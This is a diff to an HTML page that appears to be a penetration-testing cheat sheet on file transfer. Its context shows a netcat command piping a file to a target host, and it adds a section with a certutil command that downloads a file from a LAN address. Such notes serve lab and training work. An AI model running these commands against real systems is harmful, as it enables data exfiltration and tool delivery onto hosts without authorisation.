@@ -182,7 +182,20 @@
                     <p>From where you transfer the file</p>
                     <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
                 </ul>
-            </div>               
+            </div>
+            
+            <div class="notion-header"> 
+                <h1 id="Certutil">Certutil</h1>
+            </div>
+            
+            <div class="notion-body">
+                <ul>
+                    <h2> Transfer files </h2>
+                    <p>Where you recieve the file</p>
+                    <pre><code class="language-python">certutil -urlcache -split -f "http://192.168.1.1/resource"</code> </pre>
+                    
+                </ul>
+            </div>        
     </div>
 
     <!-- Mover el script al final del body para asegurar que todo el DOM esté cargado -->
